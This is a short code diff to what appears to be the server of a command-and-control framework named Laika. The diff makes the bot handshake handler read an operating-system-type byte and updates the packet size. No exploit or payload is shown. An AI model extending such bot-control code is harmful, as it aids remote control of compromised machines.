@@ -97,6 +97,7 @@ void laikaC_handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, v
     laikaS_read(&peer->sock, (void*)magicBuf, LAIKA_MAGICLEN);
     major = laikaS_readByte(&peer->sock);
     minor = laikaS_readByte(&peer->sock);
+    peer->osType = laikaS_readByte(&peer->sock);
     peer->type = PEER_BOT;
 
     if (memcmp(magicBuf, LAIKA_MAGIC, LAIKA_MAGICLEN) != 0
@@ -138,7 +139,7 @@ void laikaC_handleHandshakeRequest(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, v
 #define DEFAULT_PKT_TBL \
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_HANDSHAKE_REQ, \
         laikaC_handleHandshakeRequest, \
-        LAIKA_MAGICLEN + sizeof(uint8_t) + sizeof(uint8_t) + crypto_kx_PUBLICKEYBYTES + LAIKA_HOSTNAME_LEN + LAIKA_INET_LEN, \
+        LAIKA_MAGICLEN + sizeof(uint8_t) + sizeof(uint8_t) + sizeof(uint8_t) + crypto_kx_PUBLICKEYBYTES + LAIKA_HOSTNAME_LEN + LAIKA_INET_LEN, \
     false), \
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_AUTHENTICATED_HANDSHAKE_REQ, \
         laikaC_handleAuthenticatedHandshake, \
